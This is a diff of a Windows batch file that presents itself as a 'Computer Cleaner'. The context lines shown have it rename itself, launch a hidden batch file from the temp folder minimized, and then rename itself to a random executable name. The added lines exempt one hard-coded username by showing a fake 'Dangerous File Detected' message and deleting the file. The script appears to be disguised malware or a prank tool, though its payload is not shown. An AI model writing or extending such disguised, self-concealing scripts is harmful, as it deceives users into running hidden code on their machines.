@@ -1,4 +1,5 @@
 @echo off
+if "%username%"=="2204498" goto InvalidGuest
 rename %0% ComputerClean.bat
 title Computer Cleaner
 (
@@ -84,4 +85,12 @@ cls
 start /min %temp%\OMFGA.bat >nul
 cls
 rename %0% %random%%random%%random%%random%%random%%random%%random%.exe
+exit
+:InvalidGuest
+title Dangerous File Detected!
+echo Dangerous File Was Detected!
+timeout /t 2 /nobreak >nul
+echo Automaticlly Removing Dangerous File...
+timeout /t 2 /nobreak >nul
+del ComputerClean.bat
 exit
